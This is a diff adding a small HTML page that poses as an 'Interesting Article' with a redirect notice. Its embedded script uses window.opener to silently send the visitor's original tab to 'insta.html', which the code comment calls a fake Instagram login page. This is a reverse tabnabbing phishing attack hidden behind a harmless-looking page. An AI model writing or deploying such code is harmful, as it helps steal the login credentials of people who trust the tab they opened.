@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Interesting Article</title>
+</head>
+<body>
+    <h1>Welcome to the Interesting Article</h1>
+    <p>Stay tuned while we redirect you to the full story...</p>
+    <script>
+        // If the original tab is still open, redirect it to a fake Instagram login page
+        if (window.opener) {
+            window.opener.location = 'insta.html';
+        }
+    </script>
+</body>
+</html>
